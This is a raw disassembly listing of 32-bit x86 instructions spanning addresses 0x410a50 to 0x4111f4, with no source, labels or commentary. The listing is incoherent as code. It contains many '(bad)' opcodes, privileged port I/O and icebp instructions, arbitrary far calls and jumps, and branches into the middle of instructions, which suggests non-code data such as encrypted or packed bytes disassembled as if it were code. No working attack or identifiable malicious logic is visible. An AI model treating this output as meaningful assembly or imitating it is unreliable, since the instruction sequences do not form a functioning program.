  410a50:	loopne 0x410a88
  410a52:	adc    eax,0xcb68ec16
  410a57:	pop    ebp
  410a58:	bound  edi,QWORD PTR [esi-0x24ca0132]
  410a5e:	icebp  
  410a5f:	push   esi
  410a60:	bound  eax,QWORD PTR [eax]
  410a62:	pusha  
  410a63:	inc    edi
  410a64:	inc    edx
  410a65:	jbe    0x410a41
  410a67:	push   cs
  410a68:	mov    ebp,0xc7538a40
  410a6d:	fadd   st(4),st
  410a6f:	lods   al,BYTE PTR ds:[esi]
  410a70:	sub    DWORD PTR [edi+0x74e641ea],ecx
  410a76:	mov    ds:0x4e0b31c2,eax
  410a7b:	adc    esp,eax
  410a7d:	stos   BYTE PTR es:[edi],al
  410a7e:	mov    al,ds:0x4be18d61
  410a83:	into   
  410a84:	jmp    0x410a9a
  410a86:	out    0x6,al
  410a88:	pop    ebx
  410a89:	stc    
  410a8a:	jns    0x410ad9
  410a8c:	out    dx,eax
  410a8d:	ins    BYTE PTR es:[edi],dx
  410a8e:	js     0x410a18
  410a90:	aad    0x41
  410a92:	ss aas 
  410a94:	cdq    
  410a95:	lds    edx,FWORD PTR [edx+0x4b2ebaac]
  410a9b:	push   esi
  410a9c:	mov    ch,0x4b
  410a9e:	pop    esp
  410a9f:	push   0x55cafa6f
  410aa4:	push   0x8ac8cdeb
  410aa9:	cwde   
  410aaa:	inc    eax
  410aab:	cmp    al,0x1d
  410aad:	not    DWORD PTR [ebx-0x66]
  410ab0:	mov    cl,0x84
  410ab2:	sbb    cl,ch
  410ab4:	ins    BYTE PTR es:[edi],dx
  410ab5:	cmp    eax,0xee1ae9ac
  410aba:	retf   
  410abb:	jne    0x410a7c
  410abd:	adc    DWORD PTR [edi],0xeaa5243c
  410ac3:	xchg   esp,eax
  410ac4:	sbb    bl,dl
  410ac6:	mov    edi,0x120e8126
  410acb:	in     al,0xf0
  410acd:	sub    DWORD PTR [ecx+0x438a2dbf],esp
  410ad3:	and    al,0x33
  410ad5:	repz (bad) 
  410ad7:	adc    BYTE PTR [eax],0x14
  410ada:	fucomip st,st(2)
  410adc:	imul   ebx,DWORD PTR [eax],0x6
  410adf:	stos   DWORD PTR es:[edi],eax
  410ae0:	int3   
  410ae1:	outs   dx,BYTE PTR ds:[esi]
  410ae2:	sub    al,0x94
  410ae4:	call   0x4e5e:0x347c2a8b
  410aeb:	icebp  
  410aec:	push   ebx
  410aed:	pop    edi
  410aee:	mov    ebp,fs
  410af0:	arpl   WORD PTR [esi],bx
  410af2:	rcl    BYTE PTR [edx+0x31806c2a],0xe7
  410af9:	pusha  
  410afa:	aad    0x14
  410afc:	in     al,dx
  410afd:	clc    
  410afe:	mov    ebp,0x10f15ccc
  410b03:	ss xor ah,0x38
  410b07:	dec    ebp
  410b08:	sub    al,BYTE PTR [edx]
  410b0a:	shr    DWORD PTR [eax+0x4d8617fd],cl
  410b10:	sbb    DWORD PTR ds:[edi],edx
  410b13:	push   ss
  410b14:	mov    eax,ds:0x174df92d
  410b19:	xchg   ecx,eax
  410b1a:	fs xchg edx,eax
  410b1c:	mov    ebx,0x359a6b8c
  410b21:	jbe    0x410af8
  410b23:	mov    ebx,0x1ec71dcd
  410b28:	cmp    eax,0x6f1c0c7d
  410b2d:	pop    ss
  410b2e:	das    
  410b2f:	cdq    
  410b30:	xchg   esp,eax
  410b31:	pop    es
  410b32:	xchg   esp,eax
  410b33:	dec    edi
  410b34:	push   0xf8eff718
  410b39:	rol    bl,0x44
  410b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b3d:	jno    0x410b15
  410b3f:	xchg   BYTE PTR [ebp-0x35011c61],ch
  410b45:	fwait
  410b46:	sub    eax,0x8cc1e228
  410b4b:	mov    esp,0x6c7c0501
  410b50:	inc    eax
  410b51:	mov    bl,0xe0
  410b53:	jo     0x410bb7
  410b55:	mov    esp,0xa537e631
  410b5a:	adc    al,0xee
  410b5c:	cmp    eax,0x8b3b0dfa
  410b61:	imul   esi,eax,0xffffffec
  410b64:	outs   dx,BYTE PTR ds:[esi]
  410b65:	(bad)  
  410b66:	cs jne 0x410b59
  410b69:	jp     0x410af2
  410b6b:	dec    ebp
  410b6c:	fwait
  410b6d:	stc    
  410b6e:	jl     0x410b5a
  410b70:	mov    DWORD PTR [ecx+0x3c],eax
  410b73:	xchg   edx,eax
  410b74:	hlt    
  410b75:	sbb    al,0x25
  410b77:	mov    cl,0xc1
  410b79:	ret    
  410b7a:	push   DWORD PTR [ebx]
  410b7c:	sbb    BYTE PTR [ebp+0xa],ch
  410b7f:	adc    BYTE PTR [eax-0x7f],0xc8
  410b83:	mov    esp,0x3f83655d
  410b88:	out    dx,eax
  410b89:	sbb    eax,0x9e874963
  410b8e:	js     0x410b58
  410b90:	xchg   edx,eax
  410b91:	outs   dx,BYTE PTR ds:[esi]
  410b92:	xchg   DWORD PTR [esp+eiz*8-0x44],esi
  410b96:	outs   dx,DWORD PTR ds:[esi]
  410b97:	add    DWORD PTR [eax+0x1a],0x3c1bbcae
  410b9e:	sub    ecx,ecx
  410ba0:	push   edx
  410ba1:	scas   al,BYTE PTR es:[edi]
  410ba2:	iret   
  410ba3:	cmp    dl,ah
  410ba5:	pop    edi
  410ba6:	push   ss
  410ba7:	stos   DWORD PTR es:[edi],eax
  410ba8:	xchg   esi,eax
  410ba9:	mov    cl,0xd8
  410bab:	push   ds
  410bac:	data16 sbb ch,bl
  410baf:	loop   0x410c2c
  410bb1:	lods   eax,DWORD PTR ds:[esi]
  410bb2:	pop    edi
  410bb3:	in     eax,dx
  410bb4:	and    al,0xc7
  410bb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb7:	div    DWORD PTR [ecx+0x41]
  410bba:	xchg   ecx,eax
  410bbb:	inc    edi
  410bbc:	mov    ebp,0x16be1f78
  410bc1:	aad    0x2b
  410bc3:	and    al,0x76
  410bc5:	inc    esi
  410bc6:	vunpckhpd xmm1,xmm3,XMMWORD PTR [edi]
  410bca:	inc    ecx
  410bcb:	pop    edx
  410bcc:	jo     0x410beb
  410bce:	dec    esp
  410bcf:	cmp    BYTE PTR [edx],dl
  410bd1:	cmc    
  410bd2:	(bad)  
  410bd4:	loop   0x410b90
  410bd6:	aas    
  410bd7:	or     eax,0x94c9fdd5
  410bdc:	rol    esp,cl
  410bde:	loope  0x410bcb
  410be0:	or     BYTE PTR [esi],0xbf
  410be3:	jnp    0x410ba7
  410be5:	ficomp DWORD PTR [ebx]
  410be7:	out    dx,al
  410be8:	icebp  
  410be9:	push   0x25242df1
  410bee:	retf   0x5ce6
  410bf1:	enter  0x8fda,0xd0
  410bf5:	jge    0x410c60
  410bf7:	xchg   ecx,eax
  410bf8:	dec    edx
  410bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bfa:	add    BYTE PTR [edx],0x7f
  410bfd:	jecxz  0x410bfa
  410bff:	mov    dh,0x79
  410c01:	rcr    BYTE PTR [eax+edx*2],1
  410c04:	jle    0x410bab
  410c06:	jmp    0x410c02
  410c08:	adc    eax,0xd0a95cf9
  410c0d:	sbb    eax,0xb316aca5
  410c12:	sbb    dl,BYTE PTR [eax-0x5a]
  410c15:	adc    BYTE PTR [ecx+edi*2+0x71a87e01],bl
  410c1c:	sbb    ebp,esi
  410c1e:	add    edi,DWORD PTR [ebx-0x487a2c3b]
  410c24:	pop    es
  410c25:	call   0x802a8e68
  410c2a:	pop    ss
  410c2b:	xor    ecx,ebx
  410c2d:	pop    eax
  410c2e:	cmp    eax,0x68123b61
  410c33:	push   ebp
  410c34:	inc    ebp
  410c35:	test   eax,0xb526046f
  410c3a:	int3   
  410c3b:	fadd   DWORD PTR [ebp-0x3]
  410c3e:	aas    
  410c3f:	sub    ah,bl
  410c41:	das    
  410c42:	pop    edx
  410c43:	mov    ds:0x65facdea,al
  410c48:	sbb    al,0x1
  410c4a:	dec    ebx
  410c4b:	sub    DWORD PTR [esi-0xadcdf92],edi
  410c51:	add    esi,ebp
  410c53:	inc    ebp
  410c54:	btc    eax,esp
  410c57:	popf   
  410c58:	mov    ch,0x5d
  410c5a:	push   cs
  410c5b:	xchg   esi,eax
  410c5c:	mov    al,ds:0x5351a5f6
  410c61:	jg     0x410c5c
  410c63:	inc    esp
  410c64:	stc    
  410c65:	lds    ecx,FWORD PTR [ebx]
  410c67:	sbb    al,0x18
  410c69:	sti    
  410c6a:	call   0xf72b9e
  410c6f:	xor    DWORD PTR [ebx],esp
  410c71:	xchg   edx,eax
  410c72:	dec    ebx
  410c73:	je     0x410c8b
  410c75:	xchg   ebx,eax
  410c76:	pop    ds
  410c77:	push   edi
  410c78:	or     dh,0x19
  410c7b:	inc    esp
  410c7c:	xchg   ebx,eax
  410c7d:	mov    al,ds:0x2b3a09f1
  410c82:	das    
  410c83:	mov    ecx,0x272b44c6
  410c88:	outs   dx,DWORD PTR ds:[esi]
  410c89:	test   ax,0x4a44
  410c8d:	js     0x410c45
  410c8f:	adc    BYTE PTR [ecx+ebp*4-0x122b067c],bl
  410c96:	mov    al,ds:0xb42e0a6a
  410c9b:	js     0x410c7d
  410c9d:	(bad)  
  410c9e:	xchg   esi,eax
  410c9f:	out    0xfb,eax
  410ca1:	jbe    0x410ced
  410ca3:	xor    eax,0x5c63a8c6
  410ca8:	mov    eax,ds:0xdb8809f7
  410cad:	jmp    0x9f1c54f7
  410cb2:	dec    ebx
  410cb3:	add    esp,esp
  410cb5:	and    edi,DWORD PTR [eax-0x2f]
  410cb8:	(bad)  
  410cb9:	(bad)  
  410cba:	sbb    DWORD PTR [ecx+0x2],edi
  410cbd:	es ret 0x1008
  410cc1:	daa    
  410cc2:	sti    
  410cc3:	sbb    bl,BYTE PTR ds:0xc0d83191
  410cc9:	xor    DWORD PTR [edx-0x6ea7e601],eax
  410ccf:	fneni(8087 only) 
  410cd1:	mov    edi,cs
  410cd3:	cld    
  410cd4:	sbb    eax,DWORD PTR [eax+0x2]
  410cd7:	popa   
  410cd8:	in     eax,0x9
  410cda:	xchg   ecx,eax
  410cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cdc:	aaa    
  410cdd:	inc    esp
  410cde:	stos   BYTE PTR es:[edi],al
  410cdf:	les    ebp,FWORD PTR [ecx+0x72]
  410ce2:	mov    ah,0x36
  410ce4:	lods   al,BYTE PTR ds:[esi]
  410ce5:	hlt    
  410ce6:	lods   eax,DWORD PTR ds:[esi]
  410ce7:	mov    cl,0x8
  410ce9:	dec    esi
  410cea:	mov    BYTE PTR [edx+0x3b],cl
  410ced:	mov    ecx,DWORD PTR [edi-0x2e]
  410cf0:	stos   BYTE PTR es:[edi],al
  410cf1:	jl     0x410cfa
  410cf3:	mov    al,ds:0x9ec0a110
  410cf8:	ficom  WORD PTR [ecx]
  410cfa:	inc    esp
  410cfb:	xchg   BYTE PTR [ecx+esi*8+0x278cf6ea],cl
  410d02:	inc    eax
  410d03:	mov    esp,0xfd26314d
  410d08:	or     BYTE PTR ds:0x4458f707,0x4f
  410d0f:	xchg   cl,bh
  410d11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d12:	add    al,ah
  410d14:	push   ss
  410d15:	and    al,0x6
  410d17:	ror    DWORD PTR [ebp-0x57bb0372],1
  410d1d:	push   ecx
  410d1e:	loopne 0x410d7e
  410d20:	inc    edx
  410d21:	popa   
  410d22:	ss mov bl,0x30
  410d25:	clc    
  410d26:	in     al,dx
  410d27:	mov    ebx,0x492142bb
  410d2c:	inc    ecx
  410d2d:	mov    dl,0x78
  410d2f:	out    0x57,al
  410d31:	ficomp DWORD PTR [ebp+0x1f43953f]
  410d37:	sbb    al,0x4d
  410d39:	in     eax,0x7e
  410d3b:	out    dx,eax
  410d3c:	add    DWORD PTR [edi+0x6f06a7d9],edi
  410d42:	cmp    eax,0xc82a844a
  410d47:	lock cld 
  410d49:	xor    ebx,DWORD PTR ds:0xc4e756af
  410d4f:	fcom   DWORD PTR [edx+0x7862d0bd]
  410d55:	mov    ch,0xf9
  410d57:	(bad)  
  410d58:	out    0x57,eax
  410d5a:	mov    WORD PTR [ebp+0x40],ds
  410d5d:	test   eax,0x98c17af2
  410d62:	push   ebp
  410d63:	mov    esp,0x8a03687a
  410d68:	pop    edx
  410d69:	or     BYTE PTR [ecx-0x5f5a5d8],dl
  410d6f:	sub    DWORD PTR [esi],ecx
  410d71:	jnp    0x410da4
  410d73:	mov    ebp,0xddeff92a
  410d78:	xchg   BYTE PTR [ebp+0x5bee55bd],dl
  410d7e:	daa    
  410d7f:	pop    ss
  410d80:	stos   DWORD PTR es:[edi],eax
  410d81:	add    eax,0x78b91b4f
  410d86:	fsubr  DWORD PTR [esi-0x68]
  410d89:	mov    ah,0xac
  410d8b:	cli    
  410d8c:	cdq    
  410d8d:	jbe    0x410dce
  410d8f:	or     al,0x0
  410d91:	pop    esp
  410d92:	sub    DWORD PTR gs:[ecx+0x17],esp
  410d96:	add    BYTE PTR [eax],0x93
  410d99:	xchg   edi,eax
  410d9a:	ja     0x410db3
  410d9c:	daa    
  410d9d:	sub    eax,0x350fca4a
  410da2:	jb     0x410d2c
  410da4:	cs xor esp,ebx
  410da7:	mov    ebp,0x24b56034
  410dac:	inc    edx
  410dad:	sub    BYTE PTR [esi+0x3abc7ab7],0xe
  410db4:	add    bh,BYTE PTR [esi+0x39]
  410db7:	add    al,0xcd
  410db9:	xchg   ecx,eax
  410dba:	gs (bad) 
  410dbd:	mov    ds:0x3c61401d,eax
  410dc2:	mov    DWORD PTR [eax+ebp*4-0x14],esp
  410dc6:	push   edx
  410dc7:	addr16 mov bl,0xb4
  410dca:	inc    ebp
  410dcb:	cmp    edi,ecx
  410dcd:	test   BYTE PTR [ebp-0x2c],dh
  410dd0:	jecxz  0x410d97
  410dd2:	mov    gs,esp
  410dd4:	adc    al,BYTE PTR [esi+0x68]
  410dd7:	mov    esp,0x4ee1c5f0
  410ddc:	xchg   DWORD PTR [ebx+0x5d],ebx
  410ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410de0:	mov    esp,0x8763e1aa
  410de5:	inc    ebx
  410de6:	data16 adc ch,BYTE PTR [edi]
  410de9:	pop    edx
  410dea:	cwde   
  410deb:	jmp    0xf39e:0x74dd3a16
  410df2:	inc    bx
  410df4:	xor    al,0xb4
  410df6:	push   edx
  410df7:	and    DWORD PTR [si],esp
  410dfa:	jbe    0x410da1
  410dfc:	aad    0x61
  410dfe:	xor    al,0x2
  410e00:	push   esp
  410e01:	mov    WORD PTR ds:0x877e67e1,fs
  410e07:	addr16 push ds
  410e09:	mov    ds:0x63bcabe1,eax
  410e0e:	sub    eax,0x37436010
  410e13:	push   eax
  410e14:	call   0x4b2f47c6
  410e19:	pop    edx
  410e1a:	sbb    DWORD PTR [edi],ebp
  410e1c:	add    eax,0xfbc1a477
  410e21:	inc    ebx
  410e22:	pop    eax
  410e23:	inc    esi
  410e24:	jg     0x410de0
  410e26:	dec    edx
  410e27:	push   es
  410e28:	bound  eax,QWORD PTR cs:[ebx]
  410e2b:	mov    ebx,cs
  410e2d:	add    cl,BYTE PTR [edi]
  410e2f:	jbe    0x410e63
  410e31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e32:	repz push 0x27
  410e35:	and    eax,0x9f1c3892
  410e3a:	pop    ds
  410e3b:	iret   
  410e3c:	scas   al,BYTE PTR es:[edi]
  410e3d:	sbb    bl,BYTE PTR cs:[ebx]
  410e40:	outs   dx,DWORD PTR ds:[esi]
  410e41:	(bad)  
  410e42:	jmp    0x410e2b
  410e44:	out    0xd4,al
  410e46:	push   0x33
  410e48:	dec    esi
  410e49:	pxor   mm2,QWORD PTR [edi+0x50f04a70]
  410e50:	pop    eax
  410e51:	or     al,0x64
  410e53:	out    dx,eax
  410e54:	sub    cl,0xe7
  410e57:	stos   DWORD PTR es:[edi],eax
  410e58:	mov    al,ds:0x94b39077
  410e5d:	pop    ecx
  410e5e:	es nop
  410e60:	pop    ebp
  410e61:	sti    
  410e62:	xchg   ecx,eax
  410e63:	add    esi,DWORD PTR [ebp+edi*1+0x2ba62610]
  410e6a:	dec    ebp
  410e6b:	call   0x5f8bff3e
  410e70:	xor    eax,0x44fa1ec0
  410e75:	xchg   esp,eax
  410e76:	push   es
  410e77:	retf   0xa6e3
  410e7a:	(bad)  
  410e7b:	stc    
  410e7c:	icebp  
  410e7d:	mov    dh,0xbf
  410e7f:	mov    eax,0xe9b6f39d
  410e84:	push   esi
  410e85:	lahf   
  410e86:	in     al,dx
  410e87:	push   esi
  410e88:	sbb    DWORD PTR [edi],edi
  410e8a:	push   cs
  410e8b:	je     0x410eab
  410e8d:	xor    bh,BYTE PTR [edx]
  410e8f:	cwde   
  410e90:	mov    ah,0xd7
  410e92:	sbb    DWORD PTR [esi+0x42],ecx
  410e95:	in     eax,0xd2
  410e97:	test   esi,0xe13ebbdb
  410e9d:	adc    al,0x2d
  410e9f:	mov    esp,ebx
  410ea1:	clc    
  410ea2:	arpl   WORD PTR [eax+edx*2-0x1402f66e],ax
  410ea9:	pop    esp
  410eaa:	inc    ebx
  410eab:	mov    ecx,0x299e9bc6
  410eb0:	mov    ebp,0x97f7665a
  410eb5:	call   0x6493:0x9641e9a4
  410ebc:	std    
  410ebd:	mov    bl,0xc4
  410ebf:	jmp    0xfed9f669
  410ec4:	rol    BYTE PTR [edi],0xc9
  410ec7:	popf   
  410ec8:	(bad)  
  410eca:	mov    ss,WORD PTR [esi-0x65]
  410ecd:	mov    bl,0xaa
  410ecf:	in     eax,0x70
  410ed1:	sti    
  410ed2:	bound  ebx,QWORD PTR [edx+0x1ee29f46]
  410ed8:	mov    BYTE PTR [esi],ah
  410eda:	sbb    ebx,esp
  410edc:	sbb    BYTE PTR [edi],bh
  410ede:	aam    0x1c
  410ee0:	inc    ecx
  410ee1:	add    al,0xab
  410ee3:	cmc    
  410ee4:	imul   ebx,DWORD PTR [edx+edx*4-0x768806fa],0xffffffec
  410eec:	int3   
  410eed:	cmc    
  410eee:	and    eax,0x7269bef3
  410ef3:	clc    
  410ef4:	mov    ch,0x32
  410ef6:	xchg   esp,eax
  410ef7:	pushf  
  410ef8:	(bad)  
  410efa:	fdiv   DWORD PTR [eax]
  410efc:	mov    ebp,0x23d366a8
  410f01:	ficomp WORD PTR [edx+0x33]
  410f04:	sub    BYTE PTR [ebx],cl
  410f06:	sub    eax,0x8dac037c
  410f0b:	pushf  
  410f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f0d:	xor    al,0xeb
  410f0f:	mov    ebp,0x217065dc
  410f14:	jae    0x410eee
  410f16:	stos   BYTE PTR es:[edi],al
  410f17:	mov    ah,0x50
  410f19:	jp     0x410f92
  410f1b:	sub    al,0x18
  410f1d:	xor    eax,0x7603e7da
  410f22:	jbe    0x410ea9
  410f24:	je     0x410f55
  410f26:	ins    DWORD PTR es:[edi],dx
  410f27:	fsubr  st(3),st
  410f29:	pop    ebp
  410f2a:	xor    edi,esp
  410f2c:	cmp    al,0x78
  410f2e:	ja     0x410eb3
  410f30:	nop
  410f31:	pusha  
  410f32:	ins    BYTE PTR es:[edi],dx
  410f33:	sub    ebp,DWORD PTR [ebp+0x72dbf260]
  410f39:	stos   BYTE PTR es:[edi],al
  410f3a:	setle  BYTE PTR [edi+0x7f9db4bf]
  410f41:	cdq    
  410f42:	sar    BYTE PTR [ecx-0x61673a0],0xca
  410f49:	dec    edx
  410f4a:	retf   0x675
  410f4d:	lahf   
  410f4e:	jmp    0x460cdff7
  410f53:	pop    DWORD PTR [ebx]
  410f55:	and    cl,ch
  410f57:	mov    gs,ebx
  410f59:	xor    cl,ah
  410f5b:	int3   
  410f5c:	inc    eax
  410f5d:	push   0x50a0f7b3
  410f62:	out    0x6f,al
  410f64:	push   0x6
  410f66:	arpl   WORD PTR [edx-0x39],sp
  410f69:	mov    ds:0xb7076cc3,eax
  410f6e:	sbb    eax,0x72dbb59
  410f73:	inc    eax
  410f74:	fld    QWORD PTR [ebp-0x387651a8]
  410f7a:	ds stos BYTE PTR es:[edi],al
  410f7c:	dec    edi
  410f7d:	arpl   WORD PTR [eax-0x6ecd4ca],ax
  410f83:	popf   
  410f84:	pop    ecx
  410f85:	test   al,0xc2
  410f87:	or     DWORD PTR ds:[esp+ebx*4],0x8e35c482
  410f8f:	and    cl,dl
  410f91:	cli    
  410f92:	ret    
  410f93:	cli    
  410f94:	and    al,0x80
  410f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f97:	sti    
  410f98:	das    
  410f99:	imul   eax,ebp,0xc2fd87e1
  410f9f:	hlt    
  410fa0:	popf   
  410fa1:	repz cmp ax,0x19dc
  410fa6:	xchg   ebp,eax
  410fa7:	mov    edx,DWORD PTR [esi+ecx*4]
  410faa:	mov    al,ds:0x9439ed9b
  410faf:	pop    di
  410fb1:	pop    edi
  410fb2:	(bad)  
  410fb3:	mov    al,ds:0x8f413e6c
  410fb8:	es pop ecx
  410fba:	scas   eax,DWORD PTR es:[edi]
  410fbb:	mov    ah,0xd6
  410fbd:	stos   DWORD PTR es:[edi],eax
  410fbe:	rcr    BYTE PTR [ebp-0x2ec86ed0],0xe8
  410fc5:	aam    0x12
  410fc7:	nop
  410fc8:	ins    DWORD PTR es:[edi],dx
  410fc9:	or     al,0x33
  410fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fcd:	test   eax,0xc9545655
  410fd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd3:	push   ecx
  410fd4:	(bad)  [edx+0x5]
  410fd7:	lds    edx,FWORD PTR [esi]
  410fd9:	enter  0x8a2b,0xf0
  410fdd:	into   
  410fde:	loopne 0x410fcc
  410fe0:	mov    bl,bl
  410fe2:	pop    eax
  410fe3:	sbb    BYTE PTR [ecx+0x73210040],dl
  410fe9:	pop    ebp
  410fea:	popa   
  410feb:	arpl   WORD PTR [ecx-0x79cbd731],cx
  410ff1:	pop    esi
  410ff2:	mov    ebp,0xe11cf3c5
  410ff7:	ja     0x411072
  410ff9:	int3   
  410ffa:	jns    0x411012
  410ffc:	loope  0x410fb8
  410ffe:	sbb    dl,0xc1
  411001:	cmp    al,0xfc
  411003:	dec    ecx
  411004:	jmp    0x410fc3
  411006:	pop    edi
  411007:	sti    
  411008:	jnp    0x410fad
  41100a:	sub    dh,BYTE PTR [edi-0x114f97ab]
  411010:	loope  0x411024
  411012:	out    dx,al
  411013:	cmp    BYTE PTR ds:0x86fb16b0,0x91
  41101a:	(bad)
  41101d:	loop   0x410fd5
  41101f:	in     al,dx
  411020:	sbb    al,0x8e
  411022:	inc    ebp
  411023:	sub    eax,0xf47c557d
  411028:	mov    ds:0x58353c0a,eax
  41102d:	js     0x410fb0
  41102f:	inc    ecx
  411030:	mov    ch,0xa6
  411032:	icebp  
  411033:	xchg   esi,eax
  411034:	mov    bl,0xae
  411036:	sahf   
  411037:	xchg   ebx,eax
  411038:	pusha  
  411039:	cmp    dh,BYTE PTR [ebp+ebp*8+0x7a4219e2]
  411040:	jae    0x41105d
  411042:	shl    BYTE PTR [edx+0x38],1
  411045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411046:	jns    0x411018
  411048:	inc    ebp
  411049:	push   DWORD PTR [ebx-0x74083f97]
  41104f:	xor    dh,al
  411051:	shl    BYTE PTR [edi],cl
  411053:	dec    eax
  411054:	sub    bh,al
  411056:	xchg   edx,eax
  411057:	(bad)  
  411058:	mov    ch,0xc5
  41105a:	and    al,0x1f
  41105c:	mov    al,ds:0x506df891
  411061:	pop    ebx
  411062:	ja     0x4110a0
  411064:	inc    edi
  411065:	or     DWORD PTR [eax],ebx
  411067:	lods   eax,DWORD PTR ds:[esi]
  411068:	dec    eax
  411069:	mov    ah,0x73
  41106b:	imul   edi,DWORD PTR [ebx-0x30],0xd8c09ddd
  411072:	sbb    BYTE PTR [edi+0x46],dh
  411075:	lds    esi,FWORD PTR [esi+ebp*1+0x5a]
  411079:	fwait
  41107a:	ss leave 
  41107c:	or     BYTE PTR [esp+edx*4+0x20],cl
  411080:	xchg   edi,eax
  411081:	stos   DWORD PTR es:[edi],eax
  411082:	inc    DWORD PTR [edi-0x21]
  411085:	push   edx
  411086:	dec    edi
  411087:	mov    edi,DWORD PTR [ecx]
  411089:	in     al,dx
  41108a:	add    al,ah
  41108c:	dec    ebp
  41108d:	push   es
  41108e:	mov    ah,0x1e
  411090:	jo     0x411086
  411092:	or     al,0x3f
  411094:	js     0x4110c5
  411096:	inc    ebp
  411097:	jle    0x4110f8
  411099:	pop    edx
  41109a:	mov    dl,0x26
  41109c:	in     al,0x51
  41109e:	jns    0x4110cf
  4110a0:	mov    es,ecx
  4110a2:	sahf   
  4110a3:	call   0xe3361222
  4110a8:	jns    0x411043
  4110aa:	out    0x28,al
  4110ac:	loop   0x41103d
  4110ae:	push   esi
  4110af:	add    BYTE PTR [ebx-0x35],ch
  4110b2:	mov    ds:0xffd40002,al
  4110b7:	mov    eax,ds:0xc28bfb46
  4110bc:	repnz repnz xchg esi,eax
  4110c0:	les    eax,FWORD PTR [esi-0x2de34d93]
  4110c6:	sbb    sp,WORD PTR [eax+0x181fde18]
  4110cd:	repz mov eax,ds:0xd83fc1e0
  4110d3:	pop    edi
  4110d4:	outs   dx,DWORD PTR ds:[esi]
  4110d5:	jae    0x411119
  4110d7:	scas   eax,DWORD PTR es:[edi]
  4110d8:	rcl    DWORD PTR [esi-0x5177734c],cl
  4110de:	int    0x7a
  4110e0:	sahf   
  4110e1:	js     0x4110fc
  4110e3:	sti    
  4110e4:	(bad)  
  4110e5:	out    dx,al
  4110e6:	loopne 0x411164
  4110e8:	stc    
  4110e9:	jg     0x4110b6
  4110eb:	xchg   edi,eax
  4110ec:	(bad)  
  4110ed:	sub    esp,DWORD PTR [edi+0x13]
  4110f0:	cmp    ch,BYTE PTR [ebp+0x5a]
  4110f3:	push   ebx
  4110f4:	jmp    0xe764801c
  4110f9:	mov    ecx,0xadfd4f1a
  4110fe:	sti    
  4110ff:	push   es
  411100:	inc    edx
  411101:	fs xor eax,0xd4b9aaf8
  411107:	mov    edx,0xf126d5f
  41110c:	sub    eax,0xd75d1a36
  411111:	xor    ebx,DWORD PTR [ecx-0x56]
  411114:	pushf  
  411115:	sub    BYTE PTR [esi],ch
  411117:	ss inc edx
  411119:	or     eax,0xcffa6fd0
  41111e:	xchg   DWORD PTR [eax+eiz*2+0x6759b3d9],ebx
  411125:	retf   0xcd94
  411128:	div    DWORD PTR [ebx+ebp*4-0x19]
  41112c:	xchg   DWORD PTR [esi+0x2f276e19],eax
  411132:	inc    eax
  411133:	jno    0x411100
  411135:	js     0x411147
  411137:	sub    bl,BYTE PTR [ebx]
  411139:	lock enter 0xed03,0xad
  41113e:	rcl    DWORD PTR [ecx+0x3a],1
  411141:	xchg   ebp,eax
  411142:	xor    dl,BYTE PTR [esi-0x6e]
  411145:	xchg   edi,eax
  411146:	fsubp  st(3),st
  411148:	inc    esi
  411149:	push   edi
  41114a:	test   eax,edx
  41114c:	jbe    0x4111af
  41114e:	test   BYTE PTR [eax],al
  411150:	inc    esp
  411151:	adc    BYTE PTR [edi-0x57],ch
  411154:	jle    0x411196
  411156:	(bad)  
  411157:	cmp    BYTE PTR [esi-0x9],0x26
  41115b:	shl    ecx,1
  41115d:	xchg   edi,eax
  41115e:	icebp  
  41115f:	dec    ebx
  411160:	(bad)  
  411161:	int    0xcc
  411163:	mov    dh,0x7a
  411165:	or     ebp,DWORD PTR [eax-0x64]
  411168:	(bad)  
  411169:	xchg   edx,eax
  41116a:	cmp    eax,esi
  41116c:	mov    ch,0xde
  41116e:	stos   BYTE PTR es:[edi],al
  41116f:	inc    ebx
  411170:	popf   
  411171:	imul   ebx,DWORD PTR [eax+0x69],0xa4b0fe6
  411178:	dec    esi
  411179:	lods   al,BYTE PTR ds:[esi]
  41117a:	xor    BYTE PTR [esp+ecx*1-0x56],al
  41117e:	add    eax,0xdd0c94af
  411183:	mov    ss,WORD PTR [ebx+0x117ec332]
  411189:	dec    ebp
  41118a:	pop    esp
  41118b:	add    ecx,DWORD PTR [ebp-0x6c1b2839]
  411191:	out    dx,eax
  411192:	rol    DWORD PTR [edx],cl
  411194:	jmp    0x1a3d:0x5ffcaf67
  41119b:	adc    DWORD PTR [esi+0x275e1878],eax
  4111a1:	aam    0xfd
  4111a3:	or     al,0xe6
  4111a5:	(bad)  
  4111a6:	out    dx,eax
  4111a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111a8:	jmp    0x207f5d08
  4111ad:	pop    edi
  4111ae:	push   0xad6a15d
  4111b3:	outs   dx,DWORD PTR ds:[esi]
  4111b4:	fpatan 
  4111b6:	sbb    ebp,esp
  4111b8:	int    0x3f
  4111ba:	jecxz  0x41117e
  4111bc:	popf   
  4111bd:	cs cdq 
  4111bf:	add    BYTE PTR [esi+0x346181fc],bl
  4111c5:	sub    bh,BYTE PTR [edi]
  4111c7:	mov    ds:0x2c0cac81,al
  4111cc:	iret   
  4111cd:	out    dx,eax
  4111ce:	dec    eax
  4111cf:	sub    al,0xe
  4111d1:	pop    es
  4111d2:	lahf   
  4111d3:	and    al,0x5f
  4111d5:	aam    0x86
  4111d7:	enter  0x16cb,0xd1
  4111db:	repz add DWORD PTR ds:0x245c2249,0xa2d304fb
  4111e6:	mov    edi,0x8fb6fc68
  4111eb:	jecxz  0x4111b6
  4111ed:	push   eax
  4111ee:	adc    BYTE PTR [esi+0x3f],cl
  4111f1:	jmp    0x411261
  4111f3:	xchg   esp,eax
  4111f4:	sbb    eax,0xe6d34d5f
